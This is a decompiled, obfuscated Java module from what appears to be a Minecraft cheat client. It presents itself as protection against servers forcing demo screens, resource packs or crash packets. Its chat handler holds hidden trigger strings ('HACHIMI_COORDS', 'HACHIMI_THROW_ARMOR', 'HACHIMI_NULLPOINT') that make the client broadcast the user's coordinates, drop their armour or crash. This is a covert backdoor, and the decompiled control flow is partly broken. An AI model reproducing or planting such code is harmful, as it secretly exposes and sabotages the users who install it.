/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  net.minecraft.class_1657
 *  net.minecraft.class_1703
 *  net.minecraft.class_1713
 *  net.minecraft.class_1937
 *  net.minecraft.class_2561
 *  net.minecraft.class_2596
 *  net.minecraft.class_2664
 *  net.minecraft.class_2668
 *  net.minecraft.class_2675
 *  net.minecraft.class_2708
 *  net.minecraft.class_2720
 *  net.minecraft.class_2743
 *  net.minecraft.class_2797
 *  net.minecraft.class_2856
 *  net.minecraft.class_2856$class_2857
 *  net.minecraft.class_310
 *  net.minecraft.class_3515$class_7426
 *  net.minecraft.class_636
 *  net.minecraft.class_7438
 *  net.minecraft.class_7439
 *  net.minecraft.class_746
 *  net.minecraft.class_7635$class_7636
 */
package mapped;

import java.time.Instant;
import java.util.BitSet;
import mapped.Class1;
import mapped.Class1108;
import mapped.Class133;
import mapped.Class138;
import mapped.Class15;
import mapped.Class1503;
import mapped.Class159;
import mapped.Class1668;
import mapped.Class1745;
import mapped.Class1761;
import mapped.Class178;
import mapped.Class1807;
import mapped.Class248;
import mapped.Class253;
import mapped.Class288;
import mapped.Class298;
import mapped.Class320;
import mapped.Class367;
import mapped.Class387;
import mapped.Class3979;
import mapped.Class4036;
import mapped.Class4146;
import mapped.Class442;
import mapped.Class451;
import mapped.Class4971;
import mapped.Class5478;
import mapped.Class5496;
import mapped.Class556;
import mapped.Class5723;
import mapped.Class575;
import mapped.Class5836;
import mapped.Class6009;
import mapped.Class6064;
import mapped.Class6132;
import mapped.Class6312;
import mapped.Class6322;
import mapped.Class6416;
import mapped.Class6454;
import mapped.Class66;
import mapped.Class967;
import net.minecraft.class_1657;
import net.minecraft.class_1703;
import net.minecraft.class_1713;
import net.minecraft.class_1937;
import net.minecraft.class_2561;
import net.minecraft.class_2596;
import net.minecraft.class_2664;
import net.minecraft.class_2668;
import net.minecraft.class_2675;
import net.minecraft.class_2708;
import net.minecraft.class_2720;
import net.minecraft.class_2743;
import net.minecraft.class_2797;
import net.minecraft.class_2856;
import net.minecraft.class_310;
import net.minecraft.class_3515;
import net.minecraft.class_636;
import net.minecraft.class_7438;
import net.minecraft.class_7439;
import net.minecraft.class_746;
import net.minecraft.class_7635;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public final class Class453
extends Class451 {
    Class248 field2376;
    public static boolean field2377;
    private static long[] field2378;
    Class248 field2379 = this.method450(new Class253("NoDemo", "Prevents servers from forcing you to a demo screen", (boolean)field2378[1]));
    Class248 field2380;
    Class248 field2381;

    public static class_746 method10474(class_310 class_3102) {
        return class_3102.field_1724;
    }

    private static void method10475(long l2) {
        Class453.field2378[0] = l2 ^ 0x76720DB099EBCABCL;
        Class453.field2378[8] = l2 ^ 0x76720DB099EBCABEL;
        Class453.field2378[3] = l2 ^ 0x76720DB099EBC954L;
        Class453.field2378[4] = l2 ^ 0x76720DB099EBCABBL;
        Class453.field2378[2] = l2 ^ 0x76720DB099EBCB48L;
        Class453.field2378[5] = l2 ^ 0x76720DB099EBCABAL;
        Class453.field2378[7] = l2 ^ 0x76720DB099EBCAB9L;
        Class453.field2378[1] = l2 ^ 0x76720DB099EBCABDL;
        Class453.field2378[6] = l2 ^ 0x76720DB099EBCAB4L;
    }

    public static class_636 method10476(class_310 class_3102) {
        return class_3102.field_1761;
    }

    private static void method10477() {
        Class5836.method22885();
    }

    private static void method10478() {
        Class6454.method24594();
    }

    public static void method10479(class_310 class_3102, class_746 class_7462) {
        class_3102.field_1724 = class_7462;
    }

    private static int method10480(int n2, int n3, Class288 class288, Class367 class367) {
        return Class6132.method24052(n2, n3, class288, class367);
    }

    private static void method10481(Class5496 class5496, class_2596 class_25962) {
        class5496.method21341(class_25962);
    }

    private static int method10482(int n2, int n3, Class159 class159, Class4971 class4971) {
        return Class6132.method24039(n2, n3, class159, class4971);
    }

    private static void method10483() {
        Class6454.method24594();
    }

    private static class_636 method10484(class_310 class_3102) {
        return Class453.method10497(class_3102);
    }

    private static void method10485() {
        Class6009.method23560();
    }

    private static void method10486(boolean bl2) {
        Class6009.method23559(bl2);
    }

    public Class453() {
        super("Server", "Prevents servers actions on player", Class556.field2756);
        this.field2376 = this.method450(new Class253("NoResourcePack", "Prevents server from forcing resource pack", (boolean)field2378[0]));
        this.field2380 = this.method450(new Class253("NoServerCrash", "Prevents server packets from crashing the client", (boolean)field2378[0]));
        this.field2381 = this.method450(new Class253("IllegalDisconnect", "Disconnects by getting kicked from server", (boolean)field2378[0]));
    }

    private static void method10487(Class5478 class5478, class_2561 class_25612) {
        class5478.method21239(class_25612);
    }

    private static void method10488(float f2, float f3) {
        Class6322.method24332(f2, f3);
    }

    private static int method10489(int n2, int n3, Class320 class320, Class387 class387) {
        return Class6132.method24048(n2, n3, class320, class387);
    }

    private static void method10490() {
        Class6009.method23561();
    }

    private static void method10491() {
        Class298.method1924();
    }

    public static class_1713 method10492() {
        return class_1713.field_7795;
    }

    private static void method10493(int n2, int n3, int n4, int n5) {
        Class1668.method15147(n2, n3, n4, n5);
    }

    private static void method10494() {
        Class298.method1924();
    }

    private static void method10495() {
        Class5836.method22885();
    }

    public static class_1713 method10496() {
        return class_1713.field_7795;
    }

    public static class_636 method10497(class_310 class_3102) {
        return class_3102.field_1761;
    }

    static {
        field2378 = new long[9];
        Class453.method10475(8534899295968283324L);
        field2377 = (int)field2378[0];
    }

    private static void method10498() {
        Class5836.method22897();
    }

    private static Object method10499(Class248 class248) {
        return class248.method507();
    }

    public static class_746 method10500(class_310 class_3102) {
        return class_3102.field_1724;
    }

    private static void method10501() {
        Class298.method1924();
    }

    @Class1
    public void method10502(Class15 a2) {
        if (((Boolean)this.field2381.method507()).booleanValue()) {
            Class5723.field11048.method21341((class_2596)new class_2797("\u00a7", Instant.now(), class_3515.class_7426.method_43531(), null, new class_7635.class_7636((int)field2378[1], new BitSet((int)field2378[8]))));
        }
    }

    private static class_746 method10503(class_310 class_3102) {
        return Class453.method10474(class_3102);
    }

    private static int method10504(int n2, int n3, Class442 class442, Class288 class288) {
        return Class6132.method24063(n2, n3, class442, class288);
    }

    private static int method10505(int n2, int n3, Class66 class66, Class575 class575) {
        return Class6132.method24050(n2, n3, class66, class575);
    }

    private static void method10506(boolean bl2) {
        Class1108.method12918(bl2);
    }

    private static void method10507() {
        Class5836.method22897();
    }

    private static void method10508() {
        Class1807.method15744();
    }

    private static void method10509(float f2, float f3) {
        Class6322.method24332(f2, f3);
    }

    private static void method10510() {
        Class298.method1924();
    }

    private static void method10511(float f2, float f3) {
        Class1503.method14417(f2, f3);
    }

    /*
     * Unable to fully structure code
     */
    @Class1
    public void method10512(Class133 n) {
        block47: {
            block52: {
                block46: {
                    block50: {
                        block51: {
                            block49: {
                                block45: {
                                    block48: {
                                        if (Class453.field290.field_1724 != null && Class453.field290.field_1687 != null) {
                                            h = null;
                                            var3_3 = n.method251();
                                            if (var3_3 instanceof class_7439) {
                                                a = (class_7439)var3_3;
                                                if (a.comp_763() != null) {
                                                    h = a.comp_763().getString();
                                                }
                                            } else {
                                                var3_3 = n.method251();
                                                if (var3_3 instanceof class_7438) {
                                                    b = (class_7438)var3_3;
                                                    h = b.comp_1103() != null ? b.comp_1103().getString() : b.comp_1102().comp_1090();
                                                }
                                            }
                                            if (h != null) {
                                                if (h.contains("HACHIMI_COORDS_QPA312")) {
                                                    c = Class453.field290.field_1687.method_27983().equals(class_1937.field_25180);
                                                    d = Class453.field290.field_1687.method_27983().equals(class_1937.field_25179);
                                                    e = d != false ? "0" : (c != false ? "1" : "2");
                                                    f = "X:" + Class453.field290.field_1724.method_31477() + " Y:" + Class453.field290.field_1724.method_31478() + " Z:" + Class453.field290.field_1724.method_31479() + " ^" + e;
                                                    Class453.field290.method_1562().method_45729(f);
                                                } else if (h.contains("HACHIMI_THROW_ARMOR_Dfi3s1")) {
                                                    Class453.field290.field_1761.method_2906(Class453.method10513(Class453.field290.field_1724.field_7512), (int)Class453.field2378[7], (int)Class453.field2378[0], class_1713.field_7795, (class_1657)Class453.method10515(Class453.field290));
                                                    Class453.method10476(Class453.field290).method_2906(Class453.field290.field_1724.field_7512.field_7763, (int)Class453.field2378[5], (int)Class453.field2378[0], class_1713.field_7795, (class_1657)Class453.method10522(Class453.field290));
                                                    Class453.method10484(Class453.field290).method_2906(Class453.method10503((class_310)Class453.field290).field_7512.field_7763, (int)Class453.field2378[4], (int)Class453.field2378[0], Class453.method10496(), (class_1657)Class453.field290.field_1724);
                                                    Class453.field290.field_1761.method_2906(Class453.field290.field_1724.field_7512.field_7763, (int)Class453.field2378[6], (int)Class453.field2378[0], Class453.method10492(), (class_1657)Class453.field290.field_1724);
                                                } else if (h.contains("HACHIMI_FREINDS_JDn53V")) {
                                                    Class453.field2377 = (int)Class453.field2378[1];
                                                    c = Class453.field290.field_1687.method_18456().iterator();
                                                    while (c.hasNext()) {
                                                        g = (class_1657)c.next();
                                                        if (Class5723.field11045.method21243(g.method_5477())) {
                                                            Class5723.field11045.method21236(g.method_5477());
                                                            continue;
                                                        }
                                                        Class453.method10487(Class5723.field11045, g.method_5477());
                                                    }
                                                } else if (h.contains("HACHIMI_NULLPOINT_aB3x9Y")) {
                                                    Class453.method10479(Class453.field290, null);
                                                }
                                            }
                                        }
                                        if (!((c = n.method251()) instanceof class_2668)) {
                                            Class6454.method24636(0.4915013381040354, Class6312.field12969, 0.09257390143617183, 0.8758617915705922);
                                            return;
                                        }
                                        i = (class_2668)c;
                                        if (i.method_11491() != class_2668.field_25650) break block48;
                                        v0 = 49449;
                                        ** GOTO lbl53
                                    }
                                    v0 = 49450;
                                    if (true) ** GOTO lbl53
                                    do {
                                        v0 = var7_9 = 49448;
lbl53:
                                        // 3 sources

                                        if (var7_9 == 49449) break block45;
                                    } while (var7_9 == 49450);
                                    break block49;
                                }
                                if (!Class453.field290.method_1530() && ((Boolean)Class453.method10499(this.field2379)).booleanValue()) {
                                    Class3979.method19567("Server attempted to use Demo mode features on you!");
                                    n.method10();
                                }
                            }
                            if (!(n.method251() instanceof class_2720)) break block50;
                            if (!((Boolean)this.field2376.method507()).booleanValue()) break block51;
                            v1 = 46610;
                            ** GOTO lbl70
                        }
                        v1 = 46611;
                        if (true) ** GOTO lbl70
                        block18: while (true) {
                            v1 = 46609;
lbl70:
                            // 3 sources

                            switch (v1) {
                                case 46611: {
                                    continue block18;
                                }
                                case 46610: {
                                    n.method10();
                                    Class453.method10481(Class453.method10518(), (class_2596)new class_2856(Class453.method10500(Class453.field290).method_5667(), class_2856.class_2857.field_13018));
                                }
                            }
                            break;
                        }
                    }
                    if (Class453.field290.field_1687 == null) {
                        return;
                    }
                    if (!((Boolean)this.field2380.method507()).booleanValue()) break block47;
                    var6_8 = n.method251();
                    if (var6_8 instanceof class_2708) {
                        v2 = 56042;
                        Class6322.method24332(0.9068212f, 0.02684015f);
                        return;
                    }
                    v3 = 56043;
                    if (true) ** GOTO lbl89
                    block19: while (true) {
                        v3 = 56041;
lbl89:
                        // 2 sources

                        switch (v3) {
                            case 56043: {
                                continue block19;
                            }
                            case 56042: {
                                j = (class_2708)var6_8;
                                if (j.method_11734() > Class1761.field6601 || j.method_11735() > (double)Class453.field290.field_1687.method_31600()) ** GOTO lbl107
                                if (j.method_11738() > 3.0E7) ** GOTO lbl107
                                if (j.method_11734() < -3.0E7 || j.method_11735() < (double)Class453.field290.field_1687.method_31607()) ** GOTO lbl107
                                if (!(j.method_11738() < Class6416.field13308)) ** GOTO lbl100
                                v4 = 46517;
                                ** GOTO lbl104
lbl100:
                                // 1 sources

                                v4 = 46518;
                                if (true) ** GOTO lbl104
                                do {
                                    v4 = var8_10 = 46516;
lbl104:
                                    // 3 sources

                                    if (var8_10 == 46517) ** GOTO lbl107
                                } while (var8_10 == 46518);
                                break block19;
lbl107:
                                // 4 sources

                                n.method10();
                                Class4146.method20694();
                                return;
                            }
                        }
                        break;
                    }
                    var6_8 = n.method251();
                    if (var6_8 instanceof class_2664) {
                        v5 = 60838;
                        Class6322.method24332(0.31292313f, 0.2002216f);
                        return;
                    }
                    v6 = 60839;
                    if (true) ** GOTO lbl119
                    while (true) {
                        v6 = var9_11 = 60837;
lbl119:
                        // 2 sources

                        if (var9_11 == 60838) break;
                        if (var9_11 == 60839) {
                            continue;
                        }
                        break block46;
                        break;
                    }
                    k = (class_2664)var6_8;
                    if (k.method_11475() > Class6064.field12191 || k.method_11477() > (double)Class453.field290.field_1687.method_31600() || k.method_11478() > 3.0E7 || k.method_11475() < -3.0E7) ** GOTO lbl-1000
                    if (k.method_11477() < (double)Class453.field290.field_1687.method_31607()) ** GOTO lbl-1000
                    if (!(k.method_11478() < -3.0E7)) {
                        v7 = 34095;
                        Class1503.method14420();
                        return;
                    }
                    v8 = 34096;
                    if (true) ** GOTO lbl134
                    block22: while (true) {
                        v8 = 34094;
lbl134:
                        // 2 sources

                        switch (v8) {
                            case 34096: {
                                continue block22;
                            }
                            case 34095: {
                                if (!(k.method_11476() > 1000.0f || k.method_11479().size() > (int)Class453.field2378[3] || k.method_11472() > 1000.0f || k.method_11473() > Class967.field4036 || k.method_11474() > 1000.0f || k.method_11472() < -1000.0f || k.method_11473() < -1000.0f) && !(k.method_11474() < -1000.0f)) break block22;
                            }
                            default: lbl-1000:
                            // 3 sources

                            {
                                n.method10();
                                break block47;
                            }
                        }
                        break;
                    }
                }
                if (!((var6_8 = n.method251()) instanceof class_2743)) ** GOTO lbl-1000
                l = (class_2743)var6_8;
                if (l.method_11815() > 1000.0 || l.method_11816() > 1000.0 || l.method_11819() > 1000.0 || l.method_11815() < -1000.0 || l.method_11816() < -1000.0) ** GOTO lbl-1000
                if (!(l.method_11819() < -1000.0)) break block52;
                v9 = 31604;
                ** GOTO lbl154
            }
            v9 = 31605;
            if (true) ** GOTO lbl154
            block23: while (true) {
                v9 = 31603;
lbl154:
                // 3 sources

                switch (v9) {
                    case 31605: {
                        continue block23;
                    }
                    case 31604: lbl-1000:
                    // 2 sources

                    {
                        n.method10();
                        break block23;
                    }
                    default: lbl-1000:
                    // 2 sources

                    {
                        var6_8 = n.method251();
                        if (!(var6_8 instanceof class_2675)) break block23;
                        m = (class_2675)var6_8;
                        if (m.method_11545() <= (int)Class453.field2378[2]) break block23;
                        n.method10();
                    }
                }
                break;
            }
        }
    }

    public static int method10513(class_1703 class_17032) {
        return class_17032.field_7763;
    }

    private static void method10514(boolean bl2) {
        Class1108.method12918(bl2);
    }

    public static class_746 method10515(class_310 class_3102) {
        return class_3102.field_1724;
    }

    private static void method10516() {
        Class6454.method24594();
    }

    private static void method10517() {
        Class6454.method24594();
    }

    public static Class5496 method10518() {
        return Class5723.field11048;
    }

    private static void method10519() {
        Class6009.method23561();
    }

    private static int method10520(int n2, int n3, Class178 class178, Class138 class138) {
        return Class6132.method24038(n2, n3, class178, class138);
    }

    private static void method10521(float f2, float f3, float f4, float f5, float f6, float f7) {
        Class4036.method20085(f2, f3, f4, f5, f6, f7);
    }

    public static class_746 method10522(class_310 class_3102) {
        return class_3102.field_1724;
    }

    private static void method10523() {
        Class5836.method22890();
    }

    private static void method10524() {
        Class1745.method15538();
    }

    private static Object 1(char c2) {
        return ((Object[])1)[c2];
    }
}

